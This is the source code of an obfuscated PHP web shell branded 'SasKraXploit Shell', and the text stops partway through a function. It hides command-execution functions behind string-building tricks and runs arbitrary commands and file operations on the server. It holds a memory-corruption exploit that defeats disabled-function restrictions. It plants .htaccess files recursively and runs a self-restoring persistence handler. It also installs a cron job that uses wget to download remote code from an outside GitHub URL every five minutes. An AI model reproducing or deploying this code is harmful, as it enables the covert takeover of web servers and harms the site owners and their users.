<?php
class Pukimak {
    private $awakening;
    private $cyaa;
    private $content;

    public function __construct($cyaa) {
        $this->awakening = $cyaa;
    }

    public function execute() {
	}
};
function GjKlPwQcF($s)
{
    $b = 'c' . 'h' . 'o' . 'p';
    return $b($s);
}
function kJuLQgVhf($s)
{
    $b = 's' . 'y' . 's' . 't' . 'e' . 'm';
    return $b($s);
}
function OpLkJKqrTY($s)
{
    $b = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
    return $b($s);
}
function OkLjMkHg($s)
{
    $b = "\x73"."\x68"."\x65"."\x6C"."\x6C"."\x5F"."\x65"."\x78"."\x65"."\x63";
    return $b($s);
}
function vcnvSCZgBz($s)
{
    $b = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e' . '';
    return $b($s);
}
function QgRwXlZpOqK($s)
{
    $b = 't' . 'r' . 'i' . 'm';
    return $b($s);
}
function QtGdPsAnMQ($s, $a)
{
    $b = 'f'.'o'.'p'.'e'.'n';
    return $b($s, $a);
}
function LkQrTgBm($s)
{
    $b = 'g' . 'e' . 't' . '_' . 'c' . 'f' . 'g' . '_' . 'v' . 'a' . 'r';
    return $b($s);
}
function AnIanYnsQ($s)
{
    $b = 's' . 't' . 'r' . 'd' . 'ir';
    return $b($s);
}
function PlImOkQm($s)
{
    $b = 'o' . 'b' . '_' . 's' . 't' . 'a' . 'r' . 't';
    return $b;
}
function PlQiOkBgDt($s)
{
    $b = 'i' . 'n' . 'i' . '_' . 's' . 'e' . 't';
    return $b;
}
function OaQiLmKnH($s)
{
    $b = 'f' . 'i' . 'l' . 'e' . '_' . 'e' . 'x' . 'i' . 's' . 't' . 's';
    return $b($s);
}
function QiUyTbAgHk($s)
{
    $b = 's' . 'u' . 'b' . 'e' . 'v' . 'a' . 'l';
    return $b($s);
}
		$shellName = 'SasKraXploit Shell';
		$logo = 'https://f.top4top.io/p_29216zc2j1.jpg';
		$func = ["7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "7363616e646972", "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e", "6469726e616d65", "6469736b5f746f74616c5f7370616365", "6469736b5f667265655f7370616365", "696e695f676574", "707265675f6d617463685f616c6c", "706f7369785f6765747077756964", "706f7369785f6765746772676964", "70617468696e666f", "66696c656f776e6572", "66696c6567726f7570", "66696c6574797065", "676574486f73744e616d65", "676574486f737442794e616d65", "737562737472", "737472737472", "696e695f736574", "66696c65", "7374725f7265706c616365", "6578706c6f6465", "6576616c", "6f625f7374617274", "66756e6374696f6e5f657869737473", "6572726f725f7265706f7274696e67", "7365745f74696d655f6c696d6974", "636c656172737461746361636865", "646174655f64656661756c745f74696d657a6f6e655f736574", "666c757368", "7374726c656e", "7472696d", "656d707479", "6973736574", "66696c657065726d73", "7374726c656e", "636f756e74", "726f756e64", "6d696d655f636f6e74656e745f74797065", "6765745f63757272656e745f75736572", "6765746d79756964", "6765746d79676964", "706f7369785f67657465756964", "706f7369785f67657465676964"];

		for ($i = 0; $i < count($func); $i++) {
			$func[$i] = dehex($func[$i]);
		}

		session_start();
		$func[50](0);
		@$func[51](0);
		@$func[52]();
		@$func[43]('error_log', null);
		@$func[43]('log_errors',0);
		@$func[43]('max_execution_time',0);
		@$func[43]('output_buffering',0);
		@$func[43]('display_errors', 0);
		$func[53]("Asia/Jakarta");

		if (isset($_GET['dir'])) {
			$dir = $_GET['dir'];
			$func[3]($dir);
		} else {
			$dir = $func[2]();
		}
			
		$d0mains = @$func[44]("/etc/named.conf", false);
		if (!$d0mains) {
			$dom = "<font class='text-danger'>Can't Read /etc/named.conf</font>";
		} else { 
			$count = 0;
			foreach ($d0mains as $d0main) {
				if (@$func[43]($d0main, "zone")) {
					$func[32]('#zone "(.*)"#', $d0main, $domains);
					$func[54]();
					if ($func[55]($func[56]($domains[1][0])) > 2){
						$func[54]();
						$count++;
					}
				}
			}
			$dom = "<font class='text-success'>$count Domain</font>";
		}

		$dir = $func[45]("\\", "/", $dir);
		$scdir = $func[46]("/", $dir);
		$total = $func[29]($dir);
		$free = $func[30]($dir);
		$pers =  (int) ($free / $total * 100);
		$ds = @$func[31]("disable_functions");
		$show_ds = (!empty($ds)) ? "<font class='text-danger'>$ds</font>" : "<font class='text-success'>All function is accessible</font>";

		$cmd_uname = exe("uname -a");
		$uname = $func[49]('php_uname') ? $func[41](@$func[0](), 0, 120) : ($func[55]($cmd_uname) > 0 ? $cmd_uname : '( php_uname ) Function Disabled !');

		if (strtolower($func[41](PHP_OS, 0, 3)) == "win") {
			$sys = "win";
		} else {
			$sys = "unix";
		}

		if (isset($_GET['do'])) {
			$do = $_GET['do'];
			if ($do == 'delete') {
				if ($func[12]($dir)) {
					if (deleter($dir)) {
						flash("File/Folder deleted successfully!", "Success", "success", "?dir=" . dirname($dir));
					} else {
						flash("File/Folder failed to delete!", "Failed", "danger");
					}
				} else {
					flash("File/Folder is doesn't exist!", "Failed", "warning");
				}
			} else if ($do == 'download') {
				if ($func[12]($dir)) {
					header("Content-Type: application/octet-stream");
					header("Content-Transfer-Encoding: Binary");
					header("Content-Length: " . $func[10]($dir));
					header("Content-disposition: attachment; filename=\"".basename($dir)."\"");
				} else {
					flash("File is doesn't exist!", "Failed", "warning");
				}
			}
		} else {
			$do = 'filesman';
			$title = 'Files Manager';
			$icon = 'archive';
		}

		((isset($_POST["foldername"])) ? ($func[12]("$dir/{$_POST['foldername']}") ? flash("Folder name is exist!", "Failed", "warning") : ($func[15]("$dir/{$_POST['foldername']}") ? flash("Folder created successfully!", "Success", "success") : flash("Folder failed to create!", "Failed", "danger"))) : null);

		((isset($_POST["filename"]) && isset($_POST['filecontent'])) ? ($func[12]("$dir/{$_POST['filename']}") ? flash("File name is exist!", "Failed", "warning") : ($func[13]("$dir/{$_POST['filename']}", $_POST['filecontent']) ? flash("File created successfully!", "Success", "success") : flash("File failed to create!", "Failed", "danger"))) : null);

		((isset($_POST["newname"]) && isset($_POST['oldname'])) ? ($func[12]("$dir/{$_POST['newname']}") ? flash("File/Folder name is exist!", "Failed", "warning") : ($func[16]("$dir/{$_POST['oldname']}", $_POST['newname']) ? flash("File/Folder renamed successfully!", "Success", "success") : flash("File/Folder failed to rename!", "Failed", "danger"))) : null);

		((isset($_POST["filename"]) && isset($_POST['content'])) ? ($func[13]("$dir/{$_POST['filename']}", $_POST['content']) ? flash("File saved successfully!", "Success", "success") : flash("File failed to save!", "Failed", "danger")) : null);

		if (isset($_FILES["uploadfile"])) {
			$n = $_FILES["uploadfile"]["name"];
			for ($i = 0; $i < count($n); $i++) {
				if ($func[11]($_FILES["uploadfile"]["tmp_name"][$i], $n[$i])) {
					flash("File uploaded successfully!", "Success", "success");
				} else {
					flash("File failed to upload!", "Failed", "danger");
				}
			}
		}

		if (@$func[31]('open_basedir')) {
			$basedir_data = @$func[31]('open_basedir');
			if ($func[55]($basedir_data) > 120){
				$open_b = "<font class='text-success'>" . $func[41]($basedir_data, 0, 120) . "...</font>";
			} else {
				$open_b = '<font class="text-success">' . $basedir_data . '</font>';
			}
		} else {
			$open_b = '<font class="text-warning">NONE</font>';
		}

		if (!$func[49]('posix_getegid')) {
			$user = $func[49]("get_current_user") ? @$func[64]() : "????";
			$uid = $func[49]("getmyuid") ? @$func[65]() : "????";
			$gid = $func[49]("getmygid") ? @$func[66]() : "????";
			$group = "?";
		} else {
			$uid = $func[49]("posix_getpwuid") && $func[49]("posix_geteuid") ? @$func[33]($func[67]()) : ["name" => "????", "uid" => "????"];
			$gid = $func[49]("posix_getgrgid") && $func[49]("posix_getegid") ? @$func[34]($func[68]()) : ["name" => "????", "gid" => "????"];
			$user = $uid['name'];
			$uid = $uid['uid'];
			$group = $gid['name'];
			$gid = $gid['gid'];
		}

		if ($sys == 'unix') {
			if (!@$func[31]('safe_mode')) {
				if ($func[55](exe("id")) > 0) {
					$userful = ['gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl'];
					$x = 0;
					foreach ($userful as $i) {
						if (which($i)) {
							$x++;
							$useful .= $i . ', ';
						}
					}
					if ($x == 0) {
						$useful = '--------';
					}
					$downloaders = ['wget','fetch','lynx','links','curl','get','lwp-mirror'];
					$x = 0;
					foreach($downloaders as $i) {
						if (which($i)) {
							$x++;
							$downloader .= $i . ', ';
						}
					}
					if ($x == 0) {
						$downloader = '--------';
					}
				}
			}
		}

		function hex($str) {
			global $func;
			$r = "";
			for ($i = 0; $i < $func[55]($str); $i++) {
				$r .= dechex(ord($str[$i]));
			}
			return $r;
		}

		function dehex($str) {
			$r = "";
			$len = (strlen($str) - 1);
			for ($i = 0; $i < $len; $i += 2) {
				$r .= chr(hexdec($str[$i].$str[$i + 1]));
			}
			return $r;
		}
		function formatSize($bytes) {
			$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
			for ( $i = 0; $bytes >= 1024 && $i < ( count( $types ) - 1 ); $bytes /= 1024, $i++ );
			return( round( $bytes, 2 )." ".$types[$i] );
		}

		function perms($file) {
			global $func;
			$perms = fileperms($file);
			if (($perms & 0xC000) == 0xC000){
				$info = 's';
			}elseif (($perms & 0xA000) == 0xA000){
				$info = 'l';
			}elseif (($perms & 0x8000) == 0x8000){
				$info = '-';
			}elseif (($perms & 0x6000) == 0x6000){
				$info = 'b';
			}elseif (($perms & 0x4000) == 0x4000){
				$info = 'd';
			}elseif (($perms & 0x2000) == 0x2000){
				$info = 'c';
			}elseif (($perms & 0x1000) == 0x1000){
			$info = 'p';
			}else{
				$info = 'u';
			}
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));
			return $func[41](sprintf('%o', $perms), -4) . ' >> ' .$info;
		}

		function exe($in) {
			global $func;
			$out = '';
			try {
				if ($func[49]('exec')) {
					@$func[23]($in, $out);
					$out = @join("\n", $out);
				} elseif ($func[49]('passthru')) {
					$func[48]();
					@passthru($in);
					$out = $func[27]();
				} elseif($func[49]('system')) {
					$func[48]();
					@system($in);
					$out = $func[27]();
				} elseif ($func[49]('shell_exec')) {
					$out = $func[25]($in);
				} elseif ($func[49]("popen") && $func[49]("pclose")) {
					if (is_resource($f = @popen($in,"r"))) {
						$out = "";
						while(!@feof($f))
						$out .= fread($f, 1024);
						pclose($f);
					}
				} elseif ($func[49]('proc_open')) {
					$pipes = [];
					$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
					$out = @stream_get_contents($pipes[1]);
				} elseif (class_exists('COM')) {
					$ws = new COM('WScript.shell');
					$exec = $ws->exec('cmd.exe /c '.$in);
					$stdout = $exec->StdOut();
					$out = $stdout->ReadAll();
				}
			} catch(Exception $e) {}
			return $out;
		}

		function checkName($name) {
			global $func;
			if ($func[55]($name) > 18) {
				return $func[41]($name, 0, 18) . "...";
			}
			return $name;
		}

		function checkPerm($dir, $perm) {
			global $func;
			$perm = explode('>>', $perm);
			if ($func[8]($dir)) {
				return "<font class='text-success'>".$perm[0]."</font> >> <font class='text-success'>".$perm[1]."</font>";
			} elseif (!$func[9]($dir)) {
				return "<font class='text-danger'>".$perm[0]."</font> >> <font class='text-danger'>".$perm[1]."</font>";
			} else {
				return "<font class='text-secondary'>".$perm[0]."</font> >> <font class='text-secondary'>".$perm[1]."</font>";
			}
		}
		function command($cmd, $cwd, $com = false)
		{
			$iswin = substr(PHP_OS, 0, 3) == "WIN" ? true : false;
			$res = $msg = "";
			if ($cwd == "com" || $com) {
				if ($iswin && class_exists("COM")) {
					$wscript = new COM("Wscript.Shell");
					$exec = $wscript->eXeC("c:\\windows\\system32\\cmd.exe /c " . $cmd);
					$stdout = $exec->StdOut();
					$res = $stdout->ReadAll();
					$msg = "Wscript.Shell";
				}
			} else {
				chdir($cwd);
				$cwd = getcwd();
				if (OpLkJKqrTY("\x65\x78\x65\x63")) {
					@exEC($cmd, $res);
					$res = join("\n", $res);
					$msg = "\x65\x78\x65\x63";
				} elseif (OpLkJKqrTY("\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63")) {
					$res = @OkLjMkHg($cmd);
					$msg = "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63";
				} elseif (OpLkJKqrTY(vcnvSCZgBz("c3lzdGVt"))) {
					ob_start();
					@kJuLQgVhf($cmd);
					$res = ob_get_contents();
					ob_end_clean();
					$msg = vcnvSCZgBz("c3lzdGVt");
				} elseif (OpLkJKqrTY(vcnvSCZgBz("cGFzc3RocnU="))) {
					ob_start();
					@passthru($cmd);
					$res = ob_get_contents();
					ob_end_clean();
					$msg = vcnvSCZgBz("cGFzc3RocnU=");
				} elseif (OpLkJKqrTY(vcnvSCZgBz("cG9wZW4="))) {
					$fp = @popen($cmd, "r");
					if ($fp) {
						while (!feof($fp)) {
							$res .= fread($fp, 1024);
						}
					}
					@pclose($fp);
					$msg = vcnvSCZgBz("cG9wZW4=");
				} elseif (OpLkJKqrTY(vcnvSCZgBz("cHJvY19vcGVu"))) {
					$env = $iswin
						? ["path" => "c:\\windows\\system32"]
						: [
							"path" =>
								"/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin",
						];
					$des = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
					$process = @proc_open($cmd, $des, $pipes, $cwd, $env);
					if (is_resource($process)) {
						fwrite($pipes[0], $cmd);
						fclose($pipes[0]);
						$res .= stream_get_contents($pipes[1]);
						fclose($pipes[1]);
						$res .= stream_get_contents($pipes[2]);
						fclose($pipes[2]);
					}
					@proc_close($process);
					$msg = vcnvSCZgBz("cHJvY19vcGVu");
				}
			}
			$msg = $res == "" ? "<h1>NULL</h1>" : "<h2>Use " . $msg . " Success</h2>";
			return ["res" => $res, "msg" => $msg];
		}
		function getowner($item) {
			global $func;
			if ($func[49]("posix_getpwuid")) {
				$downer = @$func[33](fileowner($item));
				$downer = $downer['name'];
			} else {
				$downer = fileowner($item);
			}
			if ($func[49]("posix_getgrgid")) {
				$dgrp = @$func[34](filegroup($item));
				$dgrp = $dgrp['name'];
			} else {
				$dgrp = filegroup($item);
			}
			return $downer . '/' . $dgrp;
		}

		function geticon($file) {
			global $func;
			$ext = strtolower($func[35]($file, PATHINFO_EXTENSION));
			if ($ext == 'php' || $ext == 'html' || $ext == 'js' || $ext == 'css' || $ext == 'py' || $ext == 'perl' || $ext == 'sh') {
				return 'file-code';
			} else if ($ext == 'pdf') {
				return 'file-pdf';
			} else if ($ext == 'txt') {
				return 'file-alt';
			} else if ($ext == 'csv') {
				return 'file-csv';
			} else if ($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif') {
				return 'file-image';
			} else if ($ext == 'mp4' || $ext == '3gp' || $ext == 'mkv') {
				return 'file-video';
			} else if ($ext == 'docx' || $ext == 'doc' || $ext == 'docm') {
				return 'file-word';
			} else if ($ext == 'ppt' || $ext == 'pptx') {
				return 'file-powerpoint';
			} else if ($ext == 'xlsx' || $ext == 'xlsb' || $ext == 'xlsm' || $ext == 'xltx' || $ext == 'xltm') {
				return 'file-excel';
			} else if ($ext == 'mp3' || $ext == 'wav') {
				return 'file-audio';
			} else if ($ext == 'sql' || $ext == 'db') {
				return 'database';
			} else if ($ext == 'zip' || $ext == 'tar' || $ext == 'gz' || $ext == 'tar.gz' || $ext == '7z' || $ext == 'bz2') {
				return 'file-archive';
			} else {
				return 'file';
			}
		}

		function which($p) {
			global $func;
			$path = exe('which ' . $p);
			if (!empty($path)) {
				return $func[55]($path);
			}
			return false;
		}

		function flash($message, $status, $class, $redirect = false) {
			if (!empty($_SESSION["message"])) {
				unset($_SESSION["message"]);
			}
			if (!empty($_SESSION["class"])) {
				unset($_SESSION["class"]);
			}
			if (!empty($_SESSION["status"])) {
				unset($_SESSION["status"]);
			}
			$_SESSION["message"] = $message;
			$_SESSION["class"] = $class;
			$_SESSION["status"] = $status;
			if ($redirect) {
				header('Location: ' . $redirect);
				exit();
			}
			return true;
		}

		function clear() {
			if (!empty($_SESSION["message"])) {
				unset($_SESSION["message"]);
			}
			if (!empty($_SESSION["class"])) {
				unset($_SESSION["class"]);
			}
			if (!empty($_SESSION["status"])) {
				unset($_SESSION["status"]);
			}
			return true;
		}

		function deleter($d) {
			global $func;
			if (trim($func[35]($d, PATHINFO_BASENAME), '.') === '') {
				return false;
			};
			if ($func[6]($d)) {
				array_map("deleter", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
				rmdir($d);
				return true;
			} else {
				unlink($d);
				return true;
			}
			return false;
		}
		function kkk()
		{
			$text = $_POST["script"];
			echo "<tr><th style='width:15%;'><center>Status<center></th><th style='width:15%;'><center>Path to htccesed</center></th></tr>";
			function writeToWritableDirectories($dir, $file, $text)
			{
				$filepath = "$dir/$file";
				if (
					(is_writable($dir) && !OaQiLmKnH($filepath)) ||
					is_writable($filepath)
				) {
					$handle = QtGdPsAnMQ($filepath, "w");
					fwrite($handle, $text);
					fclose($handle);
					chmod($filepath, 0444);
					$dirs = array_filter(glob("$dir/*"), "is_dir");
					foreach ($dirs as $subdir) {
						if (is_writable($subdir)) {
							echo "<tr><td>[OK]<br></td><td>$subdir/$file</td></tr>";
							writeToWritableDirectories($subdir, $file, $text);
						} else {
							echo "<tr><td>[ERR]<br></td><td>$subdir/$file</td></tr>";
						}
					}
				}
			}
			writeToWritableDirectories(
				$_POST["d_dir"],
				"\x2E\x68\x74\x61\x63\x63\x65\x73\x73",
				$text
			);
		}
		function bypassgc2($gc2) {
			class Helper { public $a, $b, $c; }
			class Pwn {
				const LOGGING = false;
				const CHUNK_DATA_SIZE = 0x60;
				const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
				const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

				const HT_SIZE = 0x118;
				const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

				public function __construct($cmd) {
					for($i = 0; $i < 10; $i++) {
						$groom[] = self::alloc(self::STRING_SIZE);
						$groom[] = self::alloc(self::HT_STRING_SIZE);
					}
					
					$concat_str_addr = self::str2ptr($this->heap_leak(), 16);
					$fill = self::alloc(self::STRING_SIZE);

					$this->abc = self::alloc(self::STRING_SIZE);
					$abc_addr = $concat_str_addr + self::CHUNK_SIZE;
					self::log("abc @ 0x%x", $abc_addr);

					$this->free($abc_addr);
					$this->helper = new Helper;
					if(strlen($this->abc) < 0x1337) {
						self::log("uaf failed");
						return;
					}

					$this->helper->a = "leet";
					$this->helper->b = function($x) {};
					$this->helper->c = 0xfeedface;

					$helper_handlers = $this->rel_read(0);
					self::log("helper handlers @ 0x%x", $helper_handlers);

					$closure_addr = $this->rel_read(0x20);
					self::log("real closure @ 0x%x", $closure_addr);

					$closure_ce = $this->read($closure_addr + 0x10);
					self::log("closure class_entry @ 0x%x", $closure_ce);
					
					$basic_funcs = $this->get_basic_funcs($closure_ce);
					self::log("basic_functions @ 0x%x", $basic_funcs);

					$zif_system = $this->get_system($basic_funcs);
					self::log("zif_system @ 0x%x", $zif_system);

					$fake_closure_off = 0x70;
					for($i = 0; $i < 0x138; $i += 8) {
						$this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
					}
					$this->rel_write($fake_closure_off + 0x38, 1, 4);
					$handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
					$this->rel_write($fake_closure_off + $handler_offset, $zif_system);

					$fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
					self::log("fake closure @ 0x%x", $fake_closure_addr);

					$this->rel_write(0x20, $fake_closure_addr);
					($this->helper->b)($cmd);

					$this->rel_write(0x20, $closure_addr);
					unset($this->helper->b);
				}

				private function heap_leak() {
					$arr = [[], []];
					set_error_handler(function() use (&$arr, &$buf) {
						$arr = 1;
						$buf = str_repeat("\x00", self::HT_STRING_SIZE);
					});
					$arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
					return $buf;
				}

				private function free($addr) {
					$payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
					$payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
					
					$arr = [[], []];
					set_error_handler(function() use (&$arr, &$buf, &$payload) {
						$arr = 1;
						$buf = str_repeat($payload, 1);
					});
					$arr[1] .= "x";
				}

				private function rel_read($offset) {
					return self::str2ptr($this->abc, $offset);
				}

				private function rel_write($offset, $value, $n = 8) {
					for ($i = 0; $i < $n; $i++) {
						$this->abc[$offset + $i] = chr($value & 0xff);
						$value >>= 8;
					}
				}

				private function read($addr, $n = 8) {
					$this->rel_write(0x10, $addr - 0x10);
					$value = strlen($this->helper->a);
					if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
					return $value;
				}

				private function get_system($basic_funcs) {
					$addr = $basic_funcs;
					do {
						$f_entry = $this->read($addr);
						$f_name = $this->read($f_entry, 6);
						if($f_name === 0x6d6574737973) {
							return $this->read($addr + 8);
						}
						$addr += 0x20;
					} while($f_entry !== 0);
				}

				private function get_basic_funcs($addr) {
					while(true) {
						// In rare instances the standard module might lie after the addr we're starting
						// the search from. This will result in a SIGSGV when the search reaches an unmapped page.
						// In that case, changing the direction of the search should fix the crash.
						// $addr += 0x10;
						$addr -= 0x10;
						if($this->read($addr, 4) === 0xA8 &&
							in_array($this->read($addr + 4, 4),
								[20180731, 20190902, 20200930, 20210902])) {
							$module_name_addr = $this->read($addr + 0x20);
							$module_name = $this->read($module_name_addr);
							if($module_name === 0x647261646e617473) {
								self::log("standard module @ 0x%x", $addr);
								return $this->read($addr + 0x28);
							}
						}
					}
				}

				private function log($format, $val = "") {
					if(self::LOGGING) {
						printf("{$format}\n", $val);
					}
				
				}

				static function alloc($size) {
					return str_shuffle(str_repeat("A", $size));
				}

				static function str2ptr($str, $p = 0, $n = 8) {
					$address = 0;
					for($j = $n - 1; $j >= 0; $j--) {
						$address <<= 8;
						$address |= ord($str[$p + $j]);
					}
					return $address;
				}
			}
			echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['shiz'].'</font><br><code>';
			new Pwn($gc2 . ' 2>&1');
		}
		function executeCommand($command) {
			$descriptors = [
				0 => ['pipe', 'r'], // stdin
				1 => ['pipe', 'w'], // stdout
				2 => ['pipe', 'w'], // stderr
			];
		
			$gcw = "getcwd";
			$cwd = $gcw();
		
			$process = proc_open($command, $descriptors, $pipes, $cwd);
		
			if (is_resource($process)) {
				$output = stream_get_contents($pipes[1]);
				$error = stream_get_contents($pipes[2]);
		
				fclose($pipes[0]);
				fclose($pipes[1]);
				fclose($pipes[2]);
		
				$returnValue = proc_close($process);
		
				if (!empty($error)) {
					echo "<pre>Error: {$error}</pre>";
				}
		
				return $output;
			} else {
				echo "Unable to execute the command.";
			}
		}
		function remove_dot($file)
			{
				$FILES = $file;
				$pch = explode(".", $FILES);
				return $pch[0];
			}
		function lockshell($file) {
			$cwd = getcwd();
			$curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
			$temp = $_POST["temp"] ? $_POST["temp"] : "/tmp";
			if (file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler')) && file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'))) {
				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'));
				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-handler'));
			}
			mkdir($temp . "/.sessions");
			exec("cp $curFile " . $temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile) . '-text'));
			chmod($curFile, 0444);
			$handler = '
		<?php
		@ini_set("max_execution_time", 0);
		while (True){
			if (!file_exists("' . __DIR__ . '")){
				mkdir("' . __DIR__ . '");
			}
			if (!file_exists("' . $cwd . '/' . $curFile . '")){
				$text = base64_encode(file_get_contents("' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text') . '"));
				file_put_contents("' . $cwd . '/' . $curFile . '", base64_decode($text));
			}
			if (toku_perm("' . $cwd . '/' . $curFile . '") != 0444){
				chmod("' . $cwd . '/' . $curFile . '", 0444);
			}
		}
		
		function toku_perm($flename){
			return substr(sprintf("%o", fileperms($flename)), -4);
		}
		';
			$hndlers = file_put_contents($temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile)  . '-handler') . "", $handler);
			if ($hndlers) {
				exec('php ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
			} else {
				failed();
			}
		}

		function lockshell2() {
			$cwd = getcwd();
			$curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
			$temp = $_POST["temp"] ? $_POST["temp"] : "/tmp";
			if (file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler')) && file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'))) {
				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'));
				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-handler'));
			}
			mkdir($temp . "/.sessions");
			exec("cp $curFile " . $temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile) . '-text'));
			chmod($curFile, 0444);
			$handler = '
			<?php
			@ini_set("max_execution_time", 0);
			while (True){
				if (!file_exists("' . __DIR__ . '")){
					mkdir("' . __DIR__ . '");
				}
				if (!file_exists("' . $cwd . '/' . $curFile . '")){
					$text = base64_encode(file_get_contents("' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text') . '"));
					file_put_contents("' . $cwd . '/' . $curFile . '", base64_decode($text));
				}
				if (toku_perm("' . $cwd . '/' . $curFile . '") != 0444){
					chmod("' . $cwd . '/' . $curFile . '", 0444);
				}
			}

			function toku_perm($flename){
				return substr(sprintf("%o", fileperms($flename)), -4);
			}
			';
			$hndlers = file_put_contents($temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile)  . '-handler') . "", $handler);
			if ($hndlers) {
				exec('php ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
			} else {
				failed();
			}
		}

		function lockFile($namafile) {
			ob_get_flush();
			$b0 = $namafile;
			$bc = realpath(dirname($b0));
			function CC()
			{
				ob_start();
				phpinfo(1);
				$eb = ob_get_contents();
				ob_end_clean();
				preg_match("/--bindir=([^&]+)/si", $eb, $fa);
				if (isset($fa[1]) && $fa[1] != "") {
					return $fa[1] . "/php";
				}
				preg_match("/--prefix=([^&]+)/si", $eb, $fa);
				if (!isset($fa[1])) {
					return "php";
				}
				return $fa[1] . "/bin/php";
			}
			$A2 = cC();
			function F6()
			{
				$D8 = preg_match("/cli/i", php_sapi_name()) ? true : false;
				if ($D8 === false) {
					if (isset($_SERVER["argc"]) && $_SERVER["argc"] >= 2) {
						$D8 = true;
					}
				}
				if ($D8 === false) {
					if ($D8 !== basename($namafile)) {
						$D8 = true;
					}
				}
				return $D8;
			}
			function FD($A0, $e2 = "popen")
			{
				$be = explode(",", ini_get("disable_functions"));
				$e8 = [];
				foreach ($be as $Ca) {
					$e8[] = QgRwXlZpOqK($Ca);
				}
				if (in_array($e2, $e8)) {
					$e2 = "exec";
				}
				if (in_array($e2, $e8)) {
					return false;
				}
				$D5 = "";
				switch ($e2) {
					case "exec":
						exec($A0, $ab);
						foreach ($ab as $A4 => $df) {
							$D5 .= $A4 . " : " . $df . PHP_EOL;
						}
						return $D5;
					case "popen":
						$D1 = popen($A0, "r");
						while (!feof($D1)) {
							$F7 = fgets($D1, 4096);
							$D5 .= $F7;
						}
						pclose($D1);
						return $D5;
					default:
						return false;
						break;
				}
			} 
		}

		function installCronJob($dir) {
			echo '<div class="card">
					<div class="card-body form-group">
						<p class="text-muted">Crontab Automation Project</p>';
			
			$cronCommand = 'wget https://raw.githubusercontent.com/TokuHaxor/tool/main/cron -O ' . $dir . '/class.php';
			exec('(crontab -l; echo "*/5 * * * * ' . $cronCommand . '") | crontab');
			$cronList = shell_exec('crontab -l');
			
			if (empty($cronList)) {
				echo '<p class="text-muted">[+] Failed to Install</p></div></div>';
			} else {
